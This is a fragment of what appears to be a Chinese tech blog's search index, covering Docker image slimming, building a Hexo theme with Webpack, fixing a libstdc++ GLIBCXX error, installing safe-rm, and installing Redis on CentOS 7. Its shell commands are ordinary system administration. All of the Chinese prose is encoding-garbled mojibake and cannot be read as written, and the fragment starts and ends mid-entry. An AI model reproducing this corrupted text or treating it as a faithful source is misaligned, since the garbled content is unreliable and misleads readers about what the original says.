æ˜¾ç¤ºé•œåƒçš„å¤§å°ã€‚ è¦æŸ¥çœ‹ç»„æˆé•œåƒçš„ä¸­é—´é•œåƒå¤§å°ï¼Œè¯·ä½¿ç”¨ docker image history my_image:my_tagã€‚ è¿è¡Œ Docker image inspect my_image:tagï¼Œè¯¥æ ‡ç­¾å°†æ˜¾ç¤ºè·Ÿé•œåƒæœ‰å…³çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ¯ä¸ªå±‚çš„å¤§å°ã€‚ å®‰è£…å’Œä½¿ç”¨ dive å·¥å…·å¯ä»¥å¾ˆå®¹æ˜“åœ°çœ‹åˆ°é•œåƒçš„å±‚å†…å®¹ã€‚ Docker é•œåƒç˜¦èº«æ€»ç»“ å°½å¯èƒ½ä½¿ç”¨æ­£å¼çš„åŸºç¡€é•œåƒã€‚å®˜æ–¹é•œåƒå®šæœŸæ›´æ–°ï¼Œæ¯”éå®˜æ–¹é•œåƒæ›´å®‰å…¨ã€‚ åœ¨å¯èƒ½çš„æƒ…å†µä¸‹ä½¿ç”¨ä¸åŒçš„ Alpine é•œåƒï¼Œä»¥ä¿æŒä½ çš„é•œåƒè½»é‡çº§ã€‚ èªæ˜åœ°ä½¿ç”¨ç¼“å­˜ï¼Œå°†å¯èƒ½å‘ç”Ÿæ›´æ”¹çš„æŒ‡ä»¤æ”¾åœ¨ Dockerfile çš„æœ«å°¾ä½ç½®ã€‚ ä½¿ç”¨ .dockerignore æ–‡ä»¶å°†ä¸éœ€è¦çš„å’Œä¸å¿…è¦çš„æ–‡ä»¶ä»é•œåƒä¸­æ’é™¤ã€‚ ä½¿ç”¨ dive å·¥å…·ï¼Œå¯ä»¥æ£€æŸ¥ä½ çš„ Docker é•œåƒå±‚ï¼Œå¹¶å¸®åŠ©ä½ å‰Šå‡å¤šä½™çš„éƒ¨åˆ†ã€‚ å°½é‡ä¸è¦å®‰è£…ä½ ä¸éœ€è¦çš„è½¯ä»¶åŒ…ï¼Œè™½ç„¶è¿™ç‚¹å¾ˆéš¾åšåˆ°ã€‚ åœ¨è¿è¡ŒæŒ‡ä»¤çš„æœ«å°¾åŒ…å« &amp;&amp; rm -rf /var/lib/apt/lists/*ï¼Œä»¥æ¸…ç† apt ç¼“å­˜ï¼Œä½¿å…¶ä¸å­˜å‚¨åœ¨å±‚ä¸­ã€‚ å¦‚æœä½¿ç”¨ aptï¼Œè¯·åœ¨åŒä¸€æŒ‡ä»¤ä¸­å°† RUN apt-get update ä¸ apt-get install ç»“åˆä½¿ç”¨ã€‚ç„¶ååœ¨è¯¥æŒ‡ä»¤ä¸­é“¾æ¥å¤šä¸ªåŒ…ã€‚ç”¨ \\ å­—ç¬¦åœ¨å¤šè¡Œä¸ŠæŒ‰å­—æ¯é¡ºåºåˆ—å‡ºåŒ…ã€‚è¿™ç§æ–¹æ³•å‡å°‘äº†è¦æ„å»ºçš„å±‚çš„æ•°é‡ï¼Œå¹¶ä¿æŒç®€æ´ï¼Œä¾‹å¦‚ï¼š 1234RUN apt-get update &amp;&amp; apt-get install -y \\ package-one \\ package-two \\ &amp;&amp; rm -rf /var/lib/apt/lists/* æœ¬æ–‡å¼•ç”¨ è‹±æ–‡åŸæ–‡é“¾æ¥ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ–"},{title:"Webpack æ„å»º Hexo ä¸»é¢˜ Yilia çš„æºç ",url:"/posts/4cd11af0.html",text:'ç›¸å…³ç«™ç‚¹ Yilia Github Yilia å®˜æ–¹æ„å»ºæ–‡æ¡£ Yilia æ„å»ºå¸¸è§é—®é¢˜ Yilia å‡çº§ Webpack ç‰ˆæœ¬ æ„å»ºç¯å¢ƒ npm 6.5.0 node 10.15.0 webpack 1.13.2 debian 9 (stretch) ç›®å½•ç»“æ„ layout - æ¨¡æ¿ç›®å½• languages - è¯­è¨€é…ç½®ç›®å½• source-src - æºæ–‡ä»¶ç›®å½•ï¼Œç¼–è¯‘åˆ° source ç›®å½• source - Hexo åŠ è½½ä¸»é¢˜èµ„æºçš„ä¸»ç›®å½•ï¼Œéœ€è¦ç¼–è¯‘ç”Ÿæˆ ä¸€èˆ¬æ¥è¯´ï¼Œå¦‚æœæƒ³ä¿®æ”¹é¡µé¢çš„ htmlï¼Œå¯ä»¥åˆ° layout æ–‡ä»¶å¤¹é‡Œç›´æ¥ä¿®æ”¹ã€‚å¦‚æœæƒ³ä¿®æ”¹ cssã€jsï¼Œåˆ™éœ€è¦åˆ° source-src æ–‡ä»¶å¤¹é‡Œä¿®æ”¹ï¼Œå¹¶é€šè¿‡åé¢ä»‹ç»çš„æ„å»ºæ­¥éª¤ï¼Œå°†æºç ç¼–è¯‘åˆ° source ç›®å½•ä¸‹ã€‚ æ‹‰å– Yilia ä»£ç  1234567891011121314# è¿›å…¥Hexoçš„ä¸»é¢˜ç›®å½•# cd /blog-root/themes# å…‹éš†Yiliaä»£ç # git clone https://github.com/litten/hexo-theme-yilia.git# è¿›å…¥Yiliaçš„æ ¹ç›®å½•# cd hexo-theme-yilia# æ¸…ç†NPMæ¨¡å—çš„ç›®å½•# rm -rf node_modules# å®‰è£…NPMæ¨¡å—ï¼ˆå»ºè®®ä½¿ç”¨VPNï¼‰# npm install --unsafe-perm=true --allow-root æ‰§è¡Œæ„å»ºæ“ä½œ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# è¿›å…¥Yiliaçš„æ ¹ç›®å½•# cd hexo-theme-yilia# æ¸…ç†ç¼–è¯‘ç›®å½•ï¼ˆéå¿…è¦ï¼‰ï¼Œå¦‚æœåšå®¢å·²ä¸Šçº¿ä¸€æ®µæ—¶é—´ï¼Œä¸”è€ƒè™‘åˆ°æ—§ç”¨æˆ·æµè§ˆå™¨çš„ç¼“å­˜é—®é¢˜ï¼Œæ­¤æ—¶å¿…é¡»ä¿ç•™æ—§çš„ç¼–è¯‘æ–‡ä»¶ï¼Œå¦åˆ™é¡µé¢åœ¨æ—§ç”¨æˆ·çš„æµè§ˆå™¨ä¸Šå¯èƒ½ä¼šæ˜¾ç¤ºä¸æ­£å¸¸# rm -rf source/*# å¼€å‘å¯ä»¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œæ­¤æ—¶ä¼šç”¨webpackæ‰“åŒ…ï¼Œå¹¶æŠŠæ–‡ä»¶ç¼–è¯‘åˆ°sourceç›®å½•ä¸‹ï¼Œä½†ç¼–è¯‘åçš„æ–‡ä»¶ä¸ä¼šç»è¿‡å‹ç¼©å¤„ç†# ç”±äºwebpackæ‰“åŒ…å®Œæˆåï¼Œä¸ä¼šè‡ªåŠ¨é€€å‡ºï¼Œå½“çœ‹åˆ°ä»¥ä¸‹æ—¥å¿—ä¿¡æ¯ï¼Œåˆ™ä»£è¡¨ç¼–è¯‘æˆåŠŸï¼Œå¯ä»¥ä½¿ç”¨å¿«æ·é”® Crtl + C å¼ºåˆ¶é€€å‡º# npm run dev&gt; yilia@4.0.0 dev /usr/local/hexo-develop/themes/hexo-theme-yilia&gt; webpackHash: 05a7eebef4ac3b6cddcbVersion: webpack 1.15.0Time: 16582ms Asset Size Chunks Chunk Names img/scrollbar_arrow.png 3.06 kB [emitted] img/default-skin.png 547 bytes [emitted] img/preloader.gif 866 bytes [emitted] fonts/iconfont.b322fa.eot 20 kB [emitted] fonts/iconfont.8c627f.woff 13.2 kB [emitted] fonts/iconfont.16acc2.ttf 19.7 kB [emitted] fonts/iconfont.45d7ee.svg 27.5 kB [emitted]fonts/default-skin.b257fa.svg 1.55 kB [emitted] fonts/tooltip.4004ff.svg 492 bytes [emitted] main.be3dc1.js 179 kB 0 [emitted] main mobile.3bc8c9.js 337 kB 1 [emitted] mobile slider.0bdfac.js 177 kB 2 [emitted] slider main.be3dc1.css 73.7 kB 0 [emitted] main../layout/_partial/script.ejs 115 kB [emitted] ../layout/_partial/css.ejs 80 bytes [emitted] [0] multi mobile 40 bytes {1} [built] + 441 hidden modulesChild html-webpack-plugin for "../layout/_partial/script.ejs": + 3 hidden modulesChild html-webpack-plugin for "../layout/_partial/css.ejs": + 3 hidden modulesChild extract-text-webpack-plugin: + 2 hidden modulesChild extract-text-webpack-plugin: + 5 hidden modulesChild extract-text-webpack-plugin: + 8 hidden modules# å‘å¸ƒæœ€ç»ˆç‰ˆæœ¬å¯ä»¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œæ­¤æ—¶ç¼–è¯‘åä¼šç»è¿‡å‹ç¼©å¤„ç†# npm run dist# æŸ¥çœ‹ç¼–è¯‘åçš„æ–‡ä»¶åˆ—è¡¨# tree sourcesourceâ”œâ”€â”€ fontsâ”‚&nbsp;&nbsp; â”œâ”€â”€ default-skin.b257fa.svgâ”‚&nbsp;&nbsp; â”œâ”€â”€ iconfont.16acc2.ttfâ”‚&nbsp;&nbsp; â”œâ”€â”€ iconfont.45d7ee.svgâ”‚&nbsp;&nbsp; â”œâ”€â”€ iconfont.8c627f.woffâ”‚&nbsp;&nbsp; â”œâ”€â”€ iconfont.b322fa.eotâ”‚&nbsp;&nbsp; â””â”€â”€ tooltip.4004ff.svgâ”œâ”€â”€ imgâ”‚&nbsp;&nbsp; â”œâ”€â”€ default-skin.pngâ”‚&nbsp;&nbsp; â”œâ”€â”€ preloader.gifâ”‚&nbsp;&nbsp; â””â”€â”€ scrollbar_arrow.pngâ”œâ”€â”€ main.45052c.cssâ”œâ”€â”€ main.45052c.jsâ”œâ”€â”€ mobile.4c76cb.jsâ””â”€â”€ slider.daf231.js é€šè¿‡ Hexo æµ‹è¯•æ„å»ºç»“æœ 12345678910111213# è¿›å…¥åšå®¢çš„æ ¹ç›®å½•# cd /blogroot# é€šè¿‡Hexoæ¸…ç†Publicç›®å½•# hexo clean# é€šè¿‡Hexoæ„å»ºé™æ€æ–‡ä»¶# hexo generate# é€šè¿‡Hexoå¯åŠ¨æœåŠ¡# hexo server# æµè§ˆå™¨æ‰“å¼€åšå®¢é¡µé¢ï¼ŒæŸ¥çœ‹æ„å»ºç»“æœæ˜¯å¦ç”Ÿæ•ˆ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"é™æ€åšå®¢ å‰ç«¯"},{title:"Linux è§£å†³ libstdc++ çš„ç‰ˆæœ¬é—®é¢˜",url:"/posts/5bd5a253.html",text:'é”™è¯¯æ—¥å¿—ä¿¡æ¯ 1/usr/lib64/libstdc++.so.6: version \'GLIBCXX_3.4.21\' not found ç³»ç»Ÿç¯å¢ƒ 12CentOS Linux release 7.6.1810 (Core)Linux centos7 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux æŸ¥çœ‹å½“å‰ libstdc++ï¼ˆGLIBCXXï¼‰çš„ç‰ˆæœ¬ 123456789101112131415161718192021# strings /usr/lib64/libstdc++.so.6 | grep GLIBCXXGLIBCXX_3.4GLIBCXX_3.4.1GLIBCXX_3.4.2GLIBCXX_3.4.3GLIBCXX_3.4.4GLIBCXX_3.4.5GLIBCXX_3.4.6GLIBCXX_3.4.7GLIBCXX_3.4.8GLIBCXX_3.4.9GLIBCXX_3.4.10GLIBCXX_3.4.11GLIBCXX_3.4.12GLIBCXX_3.4.13GLIBCXX_3.4.14GLIBCXX_3.4.15GLIBCXX_3.4.16GLIBCXX_3.4.17GLIBCXX_3.4.18GLIBCXX_3.4.19 å¯ä»¥å‘ç°å½“å‰ç³»ç»Ÿæœ€é«˜åªæ”¯æŒ GLIBCXX_3.4.19ï¼Œå¹¶ä¸æ”¯æŒ GLIBCXX_3.4.21ï¼Œå› æ­¤å½“å®‰è£…éœ€è¦ä¾èµ– GLIBCXX_3.4.21 çš„è½¯ä»¶æ—¶ï¼Œå°±ä¼šå‡ºç° /usr/lib64/libstdc++.so.6: version \'GLIBCXX_3.4.21\' not found çš„é”™è¯¯ã€‚ æŸ¥æ‰¾ libstdc++.so.6.0.21 åº“æ–‡ä»¶ 12345# æŸ¥æ‰¾åº“æ–‡ä»¶# find / -name libstdc++.so.6.0.21# å¦‚æœlibstdc++.so.6.0.21åº“æ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™æŒ‰ç…§ä¸‹é¢çš„æ­¥éª¤ç›´æ¥åˆ›å»ºè½¯é“¾æ¥å³å¯# å¦‚æœlibstdc++.so.6.0.21åº“æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™éœ€è¦æŒ‰ç…§ä¸‹é¢çš„æ­¥éª¤ç¼–è¯‘æ–°ç‰ˆæœ¬çš„GCCï¼Œç„¶åå†åˆ›å»ºè½¯é“¾æ¥ (adsbygoogle = window.adsbygoogle || []).push({}); ç¼–è¯‘æ–°ç‰ˆæœ¬çš„ GCC GCC å„ç‰ˆæœ¬çš„ä¸‹è½½åœ°å€åœ¨è¿™é‡Œï¼Œå…¶ä¸­ gcc-5.2.0 å¯¹åº” GLIBCXX_3.4.21 ä¸ libstdc++.so.6.0.21ï¼Œè€Œ gcc-6.5.0 å¯¹åº” GLIBCXX_3.4.22 ä¸ libstdc++.so.6.0.22ï¼Œæ ¹æ®è‡ªå·±çš„éœ€è¦ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„ GCC å³å¯ã€‚ 12345678910111213141516171819202122232425# ä¸‹è½½æ–‡ä»¶ï¼ˆ117Mï¼‰# wget http://ftp.tsukuba.wide.ad.jp/software/gcc/releases/gcc-5.2.0/gcc-5.2.0.tar.bz2# è§£å‹æ–‡ä»¶# tar -xvf gcc-5.2.0.tar.bz2# è¿›å…¥è§£å‹ç›®å½•# cd gcc-5.2.0# ä¸‹è½½ç¼–è¯‘gccæ‰€éœ€çš„ä¾èµ–æ–‡ä»¶å’Œåº“# ./contrib/download_prerequisites# å»ºç«‹è¾“å‡ºç›®å½•ï¼Œç”¨äºå­˜æ”¾ç¼–è¯‘æ—¶æ‰€æœ‰äº§ç”Ÿçš„ä¸­é—´æ–‡ä»¶# mkdir build# è¿›å…¥è¾“å‡ºç›®å½•# cd build# æ‰§è¡Œconfigureé…ç½®# ../configure --enable-checking=release --enable-languages=c,c++ --disable-multilib# ç¼–è¯‘gccï¼ŒæŒ‡å®šç¼–è¯‘ä½¿ç”¨çš„çº¿ç¨‹æ•°ä¸º8ï¼Œç¼–è¯‘è€—æ—¶è¾ƒé•¿ï¼Œå¯èƒ½éœ€è¦å‡ ä¸ªå°æ—¶# make -j8# è¿™é‡Œä¸ºäº†é¿å…å½±å“ç³»ç»Ÿçš„ç¨³å®šæ€§ï¼Œæš‚æ—¶ä¸æ‰§è¡Œ"make install"å‘½ä»¤æ¥æ›¿æ¢ç³»ç»Ÿé»˜è®¤ç‰ˆæœ¬çš„gcc å»ºç«‹è½¯é“¾æ¥ 1234567891011121314151617181920212223242526272829303132# è¿›å…¥è¾“å‡ºç›®å½•# cd build# æŸ¥æ‰¾ç¼–è¯‘ç”Ÿæˆlibstdc++.soåº“æ–‡ä»¶ï¼Œä¸‹é¢æŸ¥æ‰¾åˆ°çš„libstdc++.soã€libstdc++.so.6éƒ½åªæ˜¯è½¯é“¾æ¥æ–‡ä»¶ï¼Œlibstdc++.so.6.0.21æ‰æ˜¯çœŸæ­£ç¼–è¯‘ç”Ÿæˆçš„åº“æ–‡ä»¶# find . -name "libstdc++.so*"./prev-x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so./prev-x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6./prev-x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6.0.21./stage1-x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so./stage1-x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6./stage1-x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6.0.21./x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so./x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6./x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6.0.21# æ‹·è´libstdc++.so.6.0.21åº“æ–‡ä»¶åˆ°/usr/lib64/ç›®å½•ä¸‹# cp ./x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6.0.21 /usr/lib64# å¤‡ä»½ç³»ç»ŸåŸæœ‰çš„libstdc++.so.6é“¾æ¥æ–‡ä»¶# cp /usr/lib64/libstdc++.so.6 /usr/lib64/libstdc++.so.6.bak# è¦†ç›–ç³»ç»ŸåŸæœ‰çš„libstdc++.so.6é“¾æ¥æ–‡ä»¶ï¼ˆè¿™é‡Œå°½é‡ä¸è¦å…ˆåˆ é™¤æ—§çš„å†åˆ›å»ºæ–°çš„libstdc++.so.6é“¾æ¥æ–‡ä»¶ï¼‰# ln -s -f /usr/lib64/libstdc++.so.6.0.21 /usr/lib64/libstdc++.so.6# è¿›å…¥lib64ç›®å½•# cd /usr/lib64# æŸ¥çœ‹æœ€ç»ˆçš„libstdc++.soåº“æ–‡ä»¶åˆ—è¡¨# ls -al /usr/lib64/libstdc++.so.6*lrwxrwxrwx. 1 root root 19 3æœˆ 12 10:08 /usr/lib64/libstdc++.so.6 -&gt; libstdc++.so.6.0.21-rwxr-xr-x. 1 root root 991616 10æœˆ 30 14:39 /usr/lib64/libstdc++.so.6.0.19-rwxr-xr-x. 1 root root 11485880 3æœˆ 12 10:01 /usr/lib64/libstdc++.so.6.0.21 éªŒè¯æ–°çš„ libstdc++.so.6.0.21 åº“æ–‡ä»¶æ˜¯å¦ç”Ÿæ•ˆ å¦‚æœåœ¨ä¸‹é¢çš„è¾“å‡ºç»“æœä¸­ï¼Œå‡ºç° GLIBCXX_3.4.21ï¼Œåˆ™ä»£è¡¨æ–°çš„ libstdc++.so.6.0.21 åº“æ–‡ä»¶ç”Ÿæ•ˆäº†ã€‚ 1234567891011121314151617181920212223# strings /usr/lib64/libstdc++.so.6 | grep GLIBCXXGLIBCXX_3.4GLIBCXX_3.4.1GLIBCXX_3.4.2GLIBCXX_3.4.3GLIBCXX_3.4.4GLIBCXX_3.4.5GLIBCXX_3.4.6GLIBCXX_3.4.7GLIBCXX_3.4.8GLIBCXX_3.4.9GLIBCXX_3.4.10GLIBCXX_3.4.11GLIBCXX_3.4.12GLIBCXX_3.4.13GLIBCXX_3.4.14GLIBCXX_3.4.15GLIBCXX_3.4.16GLIBCXX_3.4.17GLIBCXX_3.4.18GLIBCXX_3.4.19GLIBCXX_3.4.20GLIBCXX_3.4.21 å‚è€ƒæ–‡ç«  GLIBCXX3.4.21 not find var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"Linux å®‰è£… safe-rm å·¥å…·",url:"/posts/8ac517c2.html",text:'å‰è¨€ safe-rm æ˜¯ä¸€æ¬¾ç”¨æ¥æ›¿ä»£ä¸å®‰å…¨ rm çš„å¼€æºè½¯ä»¶ï¼Œå¯ä»¥åœ¨ /etc/safe-rm.conf æ–‡ä»¶ä¸­é…ç½®ä¿æŠ¤åå•ï¼Œå®šä¹‰å“ªäº›æ–‡ä»¶ä¸èƒ½è¢« rm åˆ é™¤ï¼Œå¯ç”¨äºé˜²æ­¢æ‰§è¡Œ rm -rf å‘½ä»¤å¯¼è‡´æ–‡ä»¶è¢«è¯¯åˆ çš„å‘ç”Ÿã€‚ å®‰è£… safe-rm å·¥å…· 123456789101112# ä¸‹è½½æ–‡ä»¶# wget https://launchpadlibrarian.net/188958703/safe-rm-0.12.tar.gz# è§£å‹æ–‡ä»¶# tar -xvf safe-rm-0.12.tar.gz# æ‹·è´å¯æ‰§è¡Œæ–‡ä»¶# cd safe-rm# cp safe-rm /usr/local/bin/# å»ºç«‹è½¯é“¾æ¥# ln -s /usr/local/bin/safe-rm /usr/local/bin/rm é…ç½® PATH ç¯å¢ƒå˜é‡ï¼ˆæŒ‰éœ€é…ç½®ï¼‰ 1234567891011# ç¡®ä¿PATHç¯å¢ƒå˜é‡ä¸­ï¼Œå­˜åœ¨/usr/local/binè·¯å¾„ï¼Œä¸”/usr/local/binè·¯å¾„æ’åœ¨/usr/binè·¯å¾„å‰é¢# ä¸€äº›è„šæœ¬ä¸­ä½¿ç”¨å®Œå…¨è·¯å¾„/bin/rmæˆ–è€…/usr/bin/rmåˆ™ä¸ä¼šå—safe-rmå½±å“# echo $PATH.. /usr/local/bin:/usr/local/sbin:/usr/bin ...# å¦‚æœPATHç¯å¢ƒå˜é‡ä¸ç¬¦åˆä¸Šé¢è¯´çš„è¦æ±‚ï¼Œåˆ™æ‰‹åŠ¨é…ç½®PATHç¯å¢ƒå˜é‡# vim /etc/profileexport PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:$PATH# å¦‚æœä¿®æ”¹äº†PATHç¯å¢ƒå˜é‡ï¼Œæ‰§è¡Œå‘½ä»¤ä½¿ä¿®æ”¹ç”Ÿæ•ˆ# source /etc/profile åˆ›å»º safe-rm é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ ä¿æŠ¤åå• 12345678910111213141516171819202122232425262728293031323334353637# é»˜è®¤çš„safe-rmé…ç½®æ–‡ä»¶æœ‰ä»¥ä¸‹ä¸¤ä¸ªï¼Œéœ€è¦è‡ªè¡Œåˆ›å»ºå…¨å±€é…ç½®ï¼š/etc/safe-rm.confç”¨æˆ·é…ç½®ï¼š~/.safe-rm# åˆ›å»ºå…¨å±€é…ç½®æ–‡ä»¶# touch /etc/safe-rm.conf# æ·»åŠ ä¿æŠ¤åå•# vim /etc/safe-rm.conf//bin/boot/dev/etc/home/initrd/lib/lib32/lib64/proc/root/sbin/sys/usr/usr/bin/usr/include/usr/lib/usr/local/usr/local/bin/usr/local/include/usr/local/sbin/usr/local/share/usr/sbin/usr/share/usr/src/var/etc/safe-rm.conf æµ‹è¯• save-rm æ˜¯å¦ç”Ÿæ•ˆ 1234567891011121314151617# åˆ›å»ºæµ‹è¯•æ–‡ä»¶# touch /home/test.txt# è¿½åŠ éœ€è¦ä¿æŠ¤çš„æ–‡ä»¶è·¯å¾„åˆ°é…ç½®æ–‡ä»¶ä¸­# vim /etc/safe-rm.conf/home/test.txt# æµ‹è¯•åˆ é™¤å—ä¿æŠ¤çš„æ–‡ä»¶è·¯å¾„ï¼Œå¦‚æœè¾“å‡ºskippingæ—¥å¿—ä»£è¡¨safe-rmç”Ÿæ•ˆ# rm /home/test.txt# rm -rf /home/test.txtsafe-rm: skipping /home/test.txt# æ³¨æ„ï¼š# é…ç½®æ–‡ä»¶é‡Œé¢çš„/etcåªèƒ½ä¿è¯æ‰§è¡Œ"rm -rf /etc"å‘½ä»¤çš„æ—¶å€™ä¸èƒ½åˆ é™¤ï¼Œä½†æ˜¯å¦‚æœæ‰§è¡Œ"rm -rf /etc/app"ï¼Œè¿˜æ˜¯å¯ä»¥åˆ é™¤appæ–‡ä»¶çš„# å¦‚æœæƒ³ä¿è¯æŸä¸ªç›®å½•ä¸‹é¢çš„æ‰€æœ‰æ–‡ä»¶éƒ½ä¸è¢«åˆ é™¤ï¼Œåˆ™é…ç½®æ–‡ä»¶é‡Œå¯ä»¥å†™æˆ/etc/*ï¼Œä½†ä½¿ç”¨é€šé…ç¬¦çš„æ–¹å¼æ— æ³•é¿å…/etcç›®å½•ä¸‹é“¾æ¥æ–‡ä»¶è¢«åˆ é™¤# ä¾‹å¦‚/libæˆ–/lib64è¿™ç§ç›®å½•ï¼Œä¸‹é¢ä¼šæœ‰å¾ˆå¤šåº“æ–‡ä»¶å¯¹åº”çš„é“¾æ¥æ–‡ä»¶ï¼Œä½¿ç”¨safe-rmå¹¶ä¸èƒ½ä¿æŠ¤é“¾æ¥æ–‡ä»¶è¢«åˆ é™¤# å»ºè®®å°†/etc/safe-rm.confåŠ å…¥åˆ°ä¿æŠ¤åå•ä¸­ï¼Œé˜²æ­¢/etc/safe-rm.confè¢«åˆ åé…ç½®å¤±æ•ˆ ä½¿ç”¨ç³»ç»Ÿé»˜è®¤çš„åˆ é™¤å‘½ä»¤ 12# ä½¿ç”¨ç³»ç»Ÿé»˜è®¤çš„åˆ é™¤å‘½ä»¤ï¼Œæ­¤æ—¶safe-rmçš„ä¿æŠ¤ä½œç”¨å°†å¤±æ•ˆ# /usr/bin/rm -rf /etc/app var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"Centos7 ç”Ÿäº§ç¯å¢ƒå®‰è£… Redisï¼ˆå•æœºï¼‰",url:"/posts/5d728ffd.html",text:'ç³»ç»Ÿç¯å¢ƒ 12CentOS Linux release 7.6.1810 (Core)Linux centos7 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux å®‰è£… Supervisor 12345678910111213# æç¤ºï¼šsupervisorä¸»è¦ç”¨äºç®¡ç†redisçš„å¼€æœºè‡ªå¯åŠ¨ï¼ˆå¸¦å®ˆæŠ¤è¿›ç¨‹ï¼‰# å®‰è£…# yum install -y supervisor# å¼€æœºè‡ªå¯åŠ¨# systemctl enable supervisord# å¯åŠ¨æœåŠ¡# systemctl start supervisord# æŸ¥çœ‹æœåŠ¡çŠ¶æ€# systemctl status supervisord æ›´æ”¹ç³»ç»Ÿçš„æœ€å¤§æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦æ•° æœ¬ç«™æ•™ç¨‹ åˆ›å»º Redis ç”¨æˆ·å’Œç”¨æˆ·ç»„ 12345678# åˆ‡æ¢rootç”¨æˆ·$ sudo -i# åˆ›å»ºredisç”¨æˆ·ç»„# groupadd redis# åˆ›å»ºredisç”¨æˆ·ï¼ˆä¸è®¾ç½®ç”¨æˆ·å¯†ç ï¼Œä¸å…è®¸è¿œç¨‹ç™»å½•ï¼‰# useradd redis -g redis ä¸‹è½½ Redis 123456789101112# åˆ›å»ºä¸‹è½½ç›®å½•# mkdir -p /home/redis/software# ä¸‹è½½# cd /home/redis/software# wget http://download.redis.io/releases/redis-5.0.5.tar.gz# è§£å‹# tar -xvf redis-5.0.5.tar.gz# åˆ é™¤ä¸‹è½½æ–‡ä»¶# rm -f redis-5.0.5.tar.gz ç¼–è¯‘å®‰è£… Redis 123456789101112131415161718192021# è¿›å…¥è§£å‹ç›®å½•# cd /home/redis/software/redis-5.0.5# ç¼–è¯‘# make# åˆ›å»ºå®‰è£…ç›®å½•# mkdir -p /usr/local/redis# å®‰è£…# cd /home/redis/software/redis-5.0.5/src# make PREFIX=/usr/local/redis install# å¤‡ä»½é…ç½®æ–‡ä»¶# cp /home/redis/software/redis-5.0.5/redis.conf /etc/redis.conf# cp /home/redis/software/redis-5.0.5/redis.conf /etc/redis.conf.default# æ–‡ä»¶æˆæƒ# chown -R redis:redis /usr/local/redis# chown redis:redis /etc/redis.conf# chown redis:redis /etc/redis.conf.default Redis åŸºç¡€é…ç½® 123456789101112131415161718# åˆ‡æ¢redisç”¨æˆ·$ sudo -i su redis# åˆ›å»ºæ•°æ®ç›®å½•ã€æ—¥å¿—ç›®å½•ã€æ—¥å¿—æ–‡ä»¶$ mkdir /usr/local/redis/data$ mkdir /usr/local/redis/logs$ touch /usr/local/redis/logs/redis.log# 